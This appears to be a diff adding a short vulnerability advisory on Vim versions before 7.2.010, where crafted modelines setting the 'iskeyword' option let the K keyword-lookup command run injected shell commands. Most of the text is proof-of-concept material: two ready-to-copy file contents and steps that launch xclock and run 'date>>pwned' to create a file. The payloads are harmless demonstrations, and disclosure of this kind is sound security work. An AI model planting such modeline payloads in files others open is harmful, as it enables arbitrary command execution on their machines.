@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/30795/info
+
+Vim is prone to multiple command-execution vulnerabilities because the application fails to sufficiently sanitize user-supplied data.
+
+Successfully exploiting these issues can allow an attacker to execute arbitrary commands with the privileges of the user running the affected application.
+
+Versions prior to Vim 7.2.010 are vulnerable. 
+
+Copy-and-paste these examples into separate files:
+
+;xclock
+vim: set iskeyword=;,@
+
+Place your cursor on ``xclock'', and press K. xclock appears.
+
+;date>>pwned
+vim: set iskeyword=1-255
+
+Place your cursor on ``date'' and press K. File ``pwned'' is created in
+the current working directory.
+
+Please note: If modeline processing is disabled, set the 'iskeyword'
+option manually. 
